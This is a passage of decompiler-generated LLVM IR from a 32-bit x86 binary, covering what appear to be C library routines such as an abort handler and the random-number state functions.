  uselistorder i32 ptrtoint (i32* @global_var_8058374.143 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805836c.141, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804e279, { 1, 0 }
  uselistorder label %dec_label_pc_804e268, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804e224, { 1, 0 }
  uselistorder label %dec_label_pc_804e203, { 1, 0 }
  uselistorder label %dec_label_pc_804e1ce, { 1, 0 }
  uselistorder label %dec_label_pc_804e1c6, { 1, 0 }
  uselistorder label %dec_label_pc_804e192, { 1, 0 }
}

define i32 @function_804e281(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e281:
  %v0_804e281 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804e28e = call i32 @function_804df3d(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8058340.140 to i8) to i32) to i32*))
  %v0_804e293 = load i32, i32* @ebx, align 4
  store i32 %v0_804e293, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32* @edx, align 4
  store i32 %v0_804e281, i32* @ebx, align 4
  %v0_804e29e = call i32 @function_804deb0()
  ret i32 %v0_804e29e

; uselistorder directives
  uselistorder i32 ()* @function_804deb0, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8058340.140 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8058340.140, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_804e2a4() local_unnamed_addr {
dec_label_pc_804e2a4:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804e2b0 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80558e8.160 to i32))
  %v12_804e2ba = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2bf

dec_label_pc_804e2bf:                             ; preds = %dec_label_pc_804e2bf.dec_label_pc_804e2bf_crit_edge, %dec_label_pc_804e2a4
  %v0_804e2bf = phi i32 [ %v12_804e2ba, %dec_label_pc_804e2a4 ], [ %v0_804e2bf.pre, %dec_label_pc_804e2bf.dec_label_pc_804e2bf_crit_edge ]
  %v1_804e2ca22 = phi i32 [ 31, %dec_label_pc_804e2a4 ], [ %v1_804e2ca, %dec_label_pc_804e2bf.dec_label_pc_804e2bf_crit_edge ]
  %v2_804e2bf = mul i32 %v1_804e2ca22, 4
  %v3_804e2bf = add i32 %v2_804e2bf, 152
  %v4_804e2bf = add i32 %v3_804e2bf, %v0_804e2bf
  %v5_804e2bf = inttoptr i32 %v4_804e2bf to i32*
  store i32 0, i32* %v5_804e2bf, align 4
  %v0_804e2ca.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e2ca = add i32 %v0_804e2ca.pre, -1
  %v9_804e2ca = icmp slt i32 %v1_804e2ca, 0
  store i32 %v1_804e2ca, i32* %eax.global-to-local, align 4
  %v1_804e2cb = icmp eq i1 %v9_804e2ca, false
  br i1 %v1_804e2cb, label %dec_label_pc_804e2bf.dec_label_pc_804e2bf_crit_edge, label %dec_label_pc_804e2cd

dec_label_pc_804e2bf.dec_label_pc_804e2bf_crit_edge: ; preds = %dec_label_pc_804e2bf
  %v0_804e2bf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e2bf

dec_label_pc_804e2cd:                             ; preds = %dec_label_pc_804e2bf
  %v0_804e2cd = load i32, i32* @ebx, align 4
  %v2_804e2d1 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804e2d1, i32* @ebx, align 4
  %v4_804e2d9 = call i32 @function_8050c28(i32 %v2_804e2d1, i32 6, i32 %v0_804e2cd, i32 %v0_804e2cd)
  store i32 %v4_804e2d9, i32* %eax.global-to-local, align 4
  %v1_804e2e1 = icmp eq i32 %v4_804e2d9, 0
  %v1_804e2e3 = icmp eq i1 %v1_804e2e1, false
  br i1 %v1_804e2e3, label %dec_label_pc_804e2f3, label %dec_label_pc_804e2e5

dec_label_pc_804e2e5:                             ; preds = %dec_label_pc_804e2cd
  %v3_804e2eb = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804e2eb = call i32 @function_804f3e4(i32 1, %_TYPEDEF_sigset_t* %v3_804e2eb, i32 0)
  store i32 %v4_804e2eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2f3

dec_label_pc_804e2f3:                             ; preds = %dec_label_pc_804e2cd, %dec_label_pc_804e2e5
  %v2_804e32b4 = phi i32 [ %v4_804e2d9, %dec_label_pc_804e2cd ], [ %v4_804e2eb, %dec_label_pc_804e2e5 ]
  %v0_804e2f3 = load i8, i8* @global_var_80580a0.161, align 32
  %v1_804e2f3 = icmp eq i8 %v0_804e2f3, 0
  %v1_804e2fa = icmp eq i1 %v1_804e2f3, false
  br i1 %v1_804e2fa, label %dec_label_pc_804e32b, label %dec_label_pc_804e2fc

dec_label_pc_804e2fc:                             ; preds = %dec_label_pc_804e2f3
  store i8 1, i8* @global_var_80580a0.161, align 32
  br label %dec_label_pc_804e303

dec_label_pc_804e303:                             ; preds = %dec_label_pc_804e36a, %dec_label_pc_804e2fc
  %v1_804e30b = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80558e8.160 to i32))
  store i32 %v1_804e30b, i32* %eax.global-to-local, align 4
  %v1_804e317 = call i32 @function_8050bec(i32 6)
  store i32 %v1_804e317, i32* %eax.global-to-local, align 4
  %v1_804e323 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80558e8.160 to i32))
  store i32 %v1_804e323, i32* %eax.global-to-local, align 4
  %v0_804e32b.pre = load i8, i8* @global_var_80580a0.161, align 32
  br label %dec_label_pc_804e32b

dec_label_pc_804e32b:                             ; preds = %dec_label_pc_804e2f3, %dec_label_pc_804e303
  %v2_804e32b = phi i32 [ %v2_804e32b4, %dec_label_pc_804e2f3 ], [ %v1_804e323, %dec_label_pc_804e303 ]
  %v0_804e32b = phi i8 [ %v0_804e2f3, %dec_label_pc_804e2f3 ], [ %v0_804e32b.pre, %dec_label_pc_804e303 ]
  %v1_804e32b = zext i8 %v0_804e32b to i32
  %v3_804e32b = and i32 %v2_804e32b, -256
  %v4_804e32b = or i32 %v1_804e32b, %v3_804e32b
  store i32 %v4_804e32b, i32* %eax.global-to-local, align 4
  %v10_804e330 = icmp eq i8 %v0_804e32b, 1
  %v1_804e332 = icmp eq i1 %v10_804e330, false
  br i1 %v1_804e332, label %dec_label_pc_804e38c, label %dec_label_pc_804e334

dec_label_pc_804e334:                             ; preds = %dec_label_pc_804e32b
  store i8 2, i8* @global_var_80580a0.161, align 32
  %v2_804e343 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804e343, i32* %eax.global-to-local, align 4
  %v3_804e348 = bitcast i32* %stack_var_-272 to i8*
  %v4_804e348 = call i32 @function_804ce60(i8* %v3_804e348, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e35f

dec_label_pc_804e35f:                             ; preds = %dec_label_pc_804e35f.dec_label_pc_804e35f_crit_edge, %dec_label_pc_804e334
  %v0_804e35f = phi i32 [ %v12_804e2ba, %dec_label_pc_804e334 ], [ %v0_804e35f.pre, %dec_label_pc_804e35f.dec_label_pc_804e35f_crit_edge ]
  %v1_804e36721 = phi i32 [ 31, %dec_label_pc_804e334 ], [ %v1_804e367, %dec_label_pc_804e35f.dec_label_pc_804e35f_crit_edge ]
  %v2_804e35f = mul i32 %v1_804e36721, 4
  %v3_804e35f = add i32 %v2_804e35f, 16
  %v4_804e35f = add i32 %v3_804e35f, %v0_804e35f
  %v5_804e35f = inttoptr i32 %v4_804e35f to i32*
  store i32 -1, i32* %v5_804e35f, align 4
  %v0_804e367.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e367 = add i32 %v0_804e367.pre, -1
  %v9_804e367 = icmp slt i32 %v1_804e367, 0
  store i32 %v1_804e367, i32* %eax.global-to-local, align 4
  %v1_804e368 = icmp eq i1 %v9_804e367, false
  br i1 %v1_804e368, label %dec_label_pc_804e35f.dec_label_pc_804e35f_crit_edge, label %dec_label_pc_804e36a

dec_label_pc_804e35f.dec_label_pc_804e35f_crit_edge: ; preds = %dec_label_pc_804e35f
  %v0_804e35f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e35f

dec_label_pc_804e36a:                             ; preds = %dec_label_pc_804e35f
  store i32 %v2_804e343, i32* %eax.global-to-local, align 4
  %v5_804e37f = call i32 @function_804eeab(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_804e367)
  store i32 %v5_804e37f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e303

dec_label_pc_804e38c:                             ; preds = %dec_label_pc_804e32b
  %v10_804e38c = icmp eq i8 %v0_804e32b, 2
  %v1_804e38e = icmp eq i1 %v10_804e38c, false
  br i1 %v1_804e38e, label %dec_label_pc_804e398, label %dec_label_pc_804e398.thread

dec_label_pc_804e398.thread:                      ; preds = %dec_label_pc_804e38c
  store i8 3, i8* @global_var_80580a0.161, align 32
  br label %dec_label_pc_804e3a1

dec_label_pc_804e398:                             ; preds = %dec_label_pc_804e38c
  %v9_804e398 = icmp eq i8 %v0_804e32b, 3
  %v1_804e39f = icmp eq i1 %v9_804e398, false
  br i1 %v1_804e39f, label %dec_label_pc_804e3b2, label %dec_label_pc_804e3a1

dec_label_pc_804e3a1:                             ; preds = %dec_label_pc_804e398.thread, %dec_label_pc_804e398
  store i8 4, i8* @global_var_80580a0.161, align 32
  %v1_804e3ad = call i32 @function_804f0c0(i32 127)
  unreachable

dec_label_pc_804e3b2:                             ; preds = %dec_label_pc_804e398, %dec_label_pc_804e3b2
  br label %dec_label_pc_804e3b2

; uselistorder directives
  uselistorder i32 %v1_804e367, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e2ca, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8* @global_var_80580a0.161, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e3b2, { 1, 0 }
  uselistorder label %dec_label_pc_804e3a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e32b, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f3, { 1, 0 }
}

define i32 @function_804e3b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e3b8:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e3c0 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3c0, i32* %stack_var_-4, align 4
  %v2_804e3ce = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e3ce, i32* @ebx, align 4
  %v2_804e3d3 = call i32 @function_804ec6e(i32 %v2_804e3ce, i32 134540395)
  %v1_804e3df = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055900.162 to i32))
  %v2_804e3e6 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804e3f0 = call i32 @function_804e599(i32* nonnull @global_var_8055918, i32 %v2_804e3e6)
  store i32 ptrtoint (i32* @global_var_8055918 to i32), i32* @eax, align 4
  store i32 %v2_804e3e6, i32* @edx, align 4
  %v2_804e3fa = call i32 @function_804ec6e(i32 %v2_804e3ce, i32 1)
  %v3_804e3ff = load i32, i32* %stack_var_-8, align 4
  %v2_804e406 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e406, i32* @ebx, align 4
  ret i32 %v3_804e3ff
}

define i32 @function_804e408(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e408:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804e419 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e419, i32* @eax, align 4
  %v2_804e41e = call i32 @function_804ec6e(i32 %v2_804e419, i32 134540395)
  %v1_804e42a = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055900.162 to i32))
  %v0_804e436 = load i32, i32* bitcast (i32** @global_var_8055920.165 to i32*), align 32
  store i32 %v0_804e436, i32* @ebx, align 4
  %v3_804e440 = call i32 @function_804e500(i32 %arg1, i32* nonnull @global_var_8055918)
  %v2_804e448 = icmp slt i32 %v3_804e440, 0
  br i1 %v2_804e448, label %dec_label_pc_804e44f, label %dec_label_pc_804e44c

dec_label_pc_804e44c:                             ; preds = %dec_label_pc_804e408
  store i32 ptrtoint (i32** @global_var_805591c.166 to i32), i32* @esi, align 4
  br label %dec_label_pc_804e44f

dec_label_pc_804e44f:                             ; preds = %dec_label_pc_804e408, %dec_label_pc_804e44c
  store i32 %v2_804e419, i32* @eax, align 4
  %v2_804e458 = call i32 @function_804ec6e(i32 %v2_804e419, i32 1)
  %v0_804e45d = load i32, i32* @esi, align 4
  ret i32 %v0_804e45d

; uselistorder directives
  uselistorder label %dec_label_pc_804e44f, { 1, 0 }
}

define i32 @function_804e465(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e465:
  %stack_var_-24 = alloca i32, align 4
  %v2_804e474 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e474, i32* @ebx, align 4
  %v2_804e479 = call i32 @function_804ec6e(i32 %v2_804e474, i32 134540395)
  %v1_804e485 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055900.162 to i32))
  %v0_804e48f = load i32, i32* bitcast (i32** @global_var_8055920.165 to i32*), align 32
  store i32 %v0_804e48f, i32* @esi, align 4
  %v4_804e4a1 = inttoptr i32 %arg2 to i32*
  %v5_804e4a1 = call i32 @function_804e68e(i32 %arg1, i32* %v4_804e4a1, i32 %arg3, i32 ptrtoint (i32* @global_var_8055918 to i32))
  store i32 %v5_804e4a1, i32* @eax, align 4
  %v2_804e4ac = call i32 @function_804ec6e(i32 %v2_804e474, i32 1)
  ret i32 ptrtoint (i32** @global_var_805591c.166 to i32)
}

define i32 @function_804e4bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e4bc:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e4bc = load i32, i32* @ebx, align 4
  store i32 %v0_804e4bc, i32* %stack_var_-4, align 4
  %v2_804e4ca = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804e4ca, i32* @ebx, align 4
  %v2_804e4cf = call i32 @function_804ec6e(i32 %v2_804e4ca, i32 134540395)
  %v1_804e4db = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055900.162 to i32))
  %v2_804e4eb = sext i32 %arg1 to i64
  %v3_804e4eb = call i32 @function_804e5f8(i64 %v2_804e4eb, i32 ptrtoint (i32* @global_var_8055918 to i32))
  store i32 ptrtoint (i32* @global_var_8055918 to i32), i32* @eax, align 4
  %v2_804e4f5 = call i32 @function_804ec6e(i32 %v2_804e4ca, i32 1)
  %v2_804e4fd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e4fd, i32* @ebx, align 4
  ret i32 %v2_804e4f5

; uselistorder directives
  uselistorder i32* @global_var_8055918, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055918 to i32), { 1, 3, 2, 0 }
}

define i32 @function_804e500(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804e500:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_804e503 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_804e50f = add i32 %arg1, 4
  store i32 %v1_804e50f, i32* %esi.global-to-local, align 4
  %v1_804e512 = add i32 %tmp4, 12
  %v2_804e512 = inttoptr i32 %v1_804e512 to i32*
  %v3_804e512 = load i32, i32* %v2_804e512, align 4
  store i32 %v3_804e512, i32* %ecx.global-to-local, align 4
  %v1_804e515 = add i32 %tmp4, 8
  %v2_804e515 = inttoptr i32 %v1_804e515 to i32*
  %v3_804e515 = load i32, i32* %v2_804e515, align 4
  %v1_804e518 = icmp eq i32 %v3_804e512, 0
  %v1_804e51a = icmp eq i1 %v1_804e518, false
  br i1 %v1_804e51a, label %dec_label_pc_804e525, label %dec_label_pc_804e51c

dec_label_pc_804e51c:                             ; preds = %dec_label_pc_804e500
  %v1_804e51c = add i32 %v3_804e515, -4
  %v2_804e51c = inttoptr i32 %v1_804e51c to i32*
  store i32 0, i32* %v2_804e51c, align 4
  br label %dec_label_pc_804e535

dec_label_pc_804e525:                             ; preds = %dec_label_pc_804e500
  %v1_804e525 = add i32 %tmp4, 4
  %v2_804e525 = inttoptr i32 %v1_804e525 to i32*
  %v3_804e525 = load i32, i32* %v2_804e525, align 4
  %v2_804e528 = sub i32 %v3_804e525, %v3_804e515
  %v2_804e52a = sdiv i32 %v2_804e528, 4
  %v3_804e52d = mul i32 %v2_804e52a, 5
  %v2_804e530 = add i32 %v3_804e52d, %v3_804e512
  store i32 %v2_804e530, i32* %eax.global-to-local, align 4
  %v2_804e532 = add i32 %v3_804e515, -4
  %v3_804e532 = inttoptr i32 %v2_804e532 to i32*
  store i32 %v2_804e530, i32* %v3_804e532, align 4
  br label %dec_label_pc_804e535

dec_label_pc_804e535:                             ; preds = %dec_label_pc_804e51c, %dec_label_pc_804e525
  %v0_804e535 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e535 = add i32 %v0_804e535, -4
  %v2_804e535 = inttoptr i32 %v1_804e535 to i32*
  %v3_804e535 = load i32, i32* %v2_804e535, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804e53d = ashr i32 %v3_804e535, 31
  %v2_804e53e = zext i32 %v3_804e535 to i64
  %v4_804e53e = zext i32 %v1_804e53d to i64
  %v5_804e53e = mul nuw i64 %v4_804e53e, 4294967296
  %v6_804e53e = or i64 %v5_804e53e, %v2_804e53e
  %v8_804e53e = sdiv i64 %v6_804e53e, 5
  %v9_804e53e = trunc i64 %v8_804e53e to i32
  store i32 %v9_804e53e, i32* %eax.global-to-local, align 4
  %v10_804e53e = srem i64 %v6_804e53e, 5
  %v11_804e53e = trunc i64 %v10_804e53e to i32
  %v6_804e543 = icmp ugt i32 %v11_804e53e, 4
  br i1 %v6_804e543, label %dec_label_pc_804e583, label %dec_label_pc_804e545

dec_label_pc_804e545:                             ; preds = %dec_label_pc_804e535
  %v1_804e545 = mul i32 %v11_804e53e, 4
  %v2_804e545 = add i32 %v1_804e545, ptrtoint (i32* @global_var_8053c54.167 to i32)
  %v3_804e545 = inttoptr i32 %v2_804e545 to i32*
  %v4_804e545 = load i32, i32* %v3_804e545, align 4
  store i32 %v4_804e545, i32* %ecx.global-to-local, align 4
  %v2_804e54c = add i32 %v1_804e545, ptrtoint (i32* @global_var_8053c40.168 to i32)
  %v3_804e54c = inttoptr i32 %v2_804e54c to i32*
  %v4_804e54c = load i32, i32* %v3_804e54c, align 4
  store i32 %v4_804e54c, i32* %ebp.global-to-local, align 4
  %v1_804e553 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e553 = add i32 %v1_804e553, 16
  %v3_804e553 = inttoptr i32 %v2_804e553 to i32*
  store i32 %v4_804e545, i32* %v3_804e553, align 4
  %v0_804e556 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e556 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e556 = add i32 %v1_804e556, 20
  %v3_804e556 = inttoptr i32 %v2_804e556 to i32*
  store i32 %v0_804e556, i32* %v3_804e556, align 4
  %v1_804e559 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e559 = add i32 %v1_804e559, 12
  %v3_804e559 = inttoptr i32 %v2_804e559 to i32*
  store i32 %v11_804e53e, i32* %v3_804e559, align 4
  %v1_804e55c = icmp eq i32 %v11_804e53e, 0
  br i1 %v1_804e55c, label %dec_label_pc_804e576, label %dec_label_pc_804e560

dec_label_pc_804e560:                             ; preds = %dec_label_pc_804e545
  %v0_804e560 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e560 = add i32 %v0_804e560, -4
  %v2_804e560 = inttoptr i32 %v1_804e560 to i32*
  %v3_804e560 = load i32, i32* %v2_804e560, align 4
  %v1_804e563 = ashr i32 %v3_804e560, 31
  %v0_804e564 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e564 = zext i32 %v3_804e560 to i64
  %v4_804e564 = zext i32 %v1_804e563 to i64
  %v5_804e564 = mul nuw i64 %v4_804e564, 4294967296
  %v6_804e564 = or i64 %v5_804e564, %v2_804e564
  %v7_804e564 = zext i32 %v0_804e564 to i64
  %v8_804e564 = sdiv i64 %v6_804e564, %v7_804e564
  %v9_804e564 = trunc i64 %v8_804e564 to i32
  %v2_804e566 = mul i32 %v9_804e564, 4
  %v3_804e566 = add i32 %v2_804e566, %v0_804e560
  %v1_804e569 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e569 = add i32 %v1_804e569, %v9_804e564
  store i32 %v2_804e569, i32* %eax.global-to-local, align 4
  %v1_804e56b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e56b = add i32 %v1_804e56b, 4
  %v3_804e56b = inttoptr i32 %v2_804e56b to i32*
  store i32 %v3_804e566, i32* %v3_804e56b, align 4
  %v0_804e56e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e56e = ashr i32 %v0_804e56e, 31
  %v0_804e56f = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e56f = zext i32 %v0_804e56e to i64
  %v4_804e56f = zext i32 %v1_804e56e to i64
  %v5_804e56f = mul nuw i64 %v4_804e56f, 4294967296
  %v6_804e56f = or i64 %v5_804e56f, %v2_804e56f
  %v7_804e56f = zext i32 %v0_804e56f to i64
  %v8_804e56f = sdiv i64 %v6_804e56f, %v7_804e56f
  %v9_804e56f = trunc i64 %v8_804e56f to i32
  store i32 %v9_804e56f, i32* %eax.global-to-local, align 4
  %v10_804e56f = srem i64 %v6_804e56f, %v7_804e56f
  %v11_804e56f = trunc i64 %v10_804e56f to i32
  %v0_804e571 = load i32, i32* %esi.global-to-local, align 4
  %v2_804e571 = mul i32 %v11_804e56f, 4
  %v3_804e571 = add i32 %v2_804e571, %v0_804e571
  %v1_804e574 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e574 = inttoptr i32 %v1_804e574 to i32*
  store i32 %v3_804e571, i32* %v2_804e574, align 4
  br label %dec_label_pc_804e576

dec_label_pc_804e576:                             ; preds = %dec_label_pc_804e545, %dec_label_pc_804e560
  %v0_804e576 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e576 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e576 = mul i32 %v1_804e576, 4
  %v3_804e576 = add i32 %v2_804e576, %v0_804e576
  store i32 %v3_804e576, i32* %eax.global-to-local, align 4
  %v1_804e579 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e579 = add i32 %v1_804e579, 8
  %v3_804e579 = inttoptr i32 %v2_804e579 to i32*
  store i32 %v0_804e576, i32* %v3_804e579, align 4
  %v0_804e57c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e57c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e57c = add i32 %v1_804e57c, 24
  %v3_804e57c = inttoptr i32 %v2_804e57c to i32*
  store i32 %v0_804e57c, i32* %v3_804e57c, align 4
  br label %dec_label_pc_804e591

dec_label_pc_804e583:                             ; preds = %dec_label_pc_804e535
  %v1_804e583 = call i32 @function_804b4bc(i32 %v0_804e503)
  store i32 %v1_804e583, i32* %eax.global-to-local, align 4
  %v1_804e588 = inttoptr i32 %v1_804e583 to i32*
  store i32 22, i32* %v1_804e588, align 4
  br label %dec_label_pc_804e591

dec_label_pc_804e591:                             ; preds = %dec_label_pc_804e576, %dec_label_pc_804e583
  %storemerge = phi i32 [ -1, %dec_label_pc_804e583 ], [ 0, %dec_label_pc_804e576 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804e503, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_804e576, { 1, 0 }
  uselistorder i32 %v11_804e53e, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e591, { 1, 0 }
  uselistorder label %dec_label_pc_804e576, { 1, 0 }
  uselistorder label %dec_label_pc_804e535, { 1, 0 }
}

define i32 @function_804e599(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e599:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804e59c = load i32, i32* @ebx, align 4
  store i32 %v0_804e59c, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804e5a5 = add i32 %tmp2, 8
  %v2_804e5a5 = inttoptr i32 %v1_804e5a5 to i32*
  %v3_804e5a5 = load i32, i32* %v2_804e5a5, align 4
  store i32 %v3_804e5a5, i32* %esi.global-to-local, align 4
  %v1_804e5a8 = add i32 %tmp2, 12
  %v2_804e5a8 = inttoptr i32 %v1_804e5a8 to i32*
  %v3_804e5a8 = load i32, i32* %v2_804e5a8, align 4
  %v4_804e5a8 = icmp eq i32 %v3_804e5a8, 0
  %v1_804e5ac = icmp eq i1 %v4_804e5a8, false
  br i1 %v1_804e5ac, label %dec_label_pc_804e5c5, label %dec_label_pc_804e5ae

dec_label_pc_804e5ae:                             ; preds = %dec_label_pc_804e599
  %v2_804e5ae = inttoptr i32 %v3_804e5a5 to i32*
  %v3_804e5ae = load i32, i32* %v2_804e5ae, align 4
  %v5_804e5ae = mul i32 %v3_804e5ae, 1103515245
  %v1_804e5b4 = add i32 %v5_804e5ae, 12345
  %v1_804e5b9 = urem i32 %v1_804e5b4, -2147483648
  store i32 %v1_804e5b9, i32* %eax.global-to-local, align 4
  store i32 %v1_804e5b9, i32* %v2_804e5ae, align 4
  %v0_804e5c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5c0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e5c0 = inttoptr i32 %v1_804e5c0 to i32*
  store i32 %v0_804e5c0, i32* %v2_804e5c0, align 4
  br label %dec_label_pc_804e5f1

dec_label_pc_804e5c5:                             ; preds = %dec_label_pc_804e599
  %v1_804e5c5 = add i32 %tmp2, 4
  %v2_804e5c5 = inttoptr i32 %v1_804e5c5 to i32*
  %v3_804e5c5 = load i32, i32* %v2_804e5c5, align 4
  store i32 %v3_804e5c5, i32* %ecx.global-to-local, align 4
  %v2_804e5c8 = load i32, i32* %arg1, align 4
  store i32 %v2_804e5c8, i32* %edx.global-to-local, align 4
  %v1_804e5ca = add i32 %tmp2, 24
  %v2_804e5ca = inttoptr i32 %v1_804e5ca to i32*
  %v3_804e5ca = load i32, i32* %v2_804e5ca, align 4
  store i32 %v3_804e5ca, i32* %edi.global-to-local, align 4
  %v1_804e5cd = inttoptr i32 %v3_804e5c5 to i32*
  %v2_804e5cd = load i32, i32* %v1_804e5cd, align 4
  store i32 %v2_804e5cd, i32* %eax.global-to-local, align 4
  %v1_804e5cf = inttoptr i32 %v2_804e5c8 to i32*
  %v2_804e5cf = load i32, i32* %v1_804e5cf, align 4
  %v4_804e5cf = add i32 %v2_804e5cf, %v2_804e5cd
  store i32 %v4_804e5cf, i32* %v1_804e5cf, align 4
  %v0_804e5d1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5d1 = inttoptr i32 %v0_804e5d1 to i32*
  %v2_804e5d1 = load i32, i32* %v1_804e5d1, align 4
  %v1_804e5d3 = add i32 %v0_804e5d1, 4
  store i32 %v1_804e5d3, i32* %edx.global-to-local, align 4
  %v2_804e5d6 = udiv i32 %v2_804e5d1, 2
  %v1_804e5d8 = load i32, i32* %edi.global-to-local, align 4
  %v7_804e5d8 = icmp ult i32 %v1_804e5d3, %v1_804e5d8
  %v1_804e5da = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e5da = inttoptr i32 %v1_804e5da to i32*
  store i32 %v2_804e5d6, i32* %v2_804e5da, align 4
  %v0_804e5dd = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e5dd = add i32 %v0_804e5dd, 4
  store i32 %v1_804e5dd, i32* %eax.global-to-local, align 4
  br i1 %v7_804e5d8, label %dec_label_pc_804e5e6, label %dec_label_pc_804e5e2

dec_label_pc_804e5e2:                             ; preds = %dec_label_pc_804e5c5
  %v0_804e5e2 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804e5e2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e5ec

